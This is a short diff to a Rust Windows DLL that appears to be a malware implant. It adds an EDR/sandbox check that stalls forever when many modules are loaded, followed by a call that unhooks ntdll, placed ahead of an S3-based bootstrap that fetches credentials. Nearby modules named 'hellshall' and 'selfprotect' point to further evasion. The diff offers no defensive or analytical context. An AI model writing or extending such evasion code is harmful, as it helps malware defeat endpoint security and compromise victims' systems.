@@ -24,6 +24,8 @@ mod hellshall;
 mod selfprotect;
 mod worker;
 mod helpers;
+mod edrcheck;
+mod unhook;
 
 use std::{thread, time::Duration};
 
@@ -44,6 +46,19 @@ pub extern "system" fn DllMain(
 }
 
 fn run() {
+    // === EDR CHECK: count loaded DLLs ===
+    let dll_count = unsafe { edrcheck::count_loaded_modules() };
+    if dll_count > config::MAX_LOADED_DLLS {
+        loop {
+            std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
+        }
+    }
+
+    // === NTDLL UNHOOKING ===
+    unsafe {
+        unhook::unhook_ntdll();
+    }
+
     // S3 bootstrap registration (get per-execution IAM credentials)
     if config::use_s3 {
         loop {
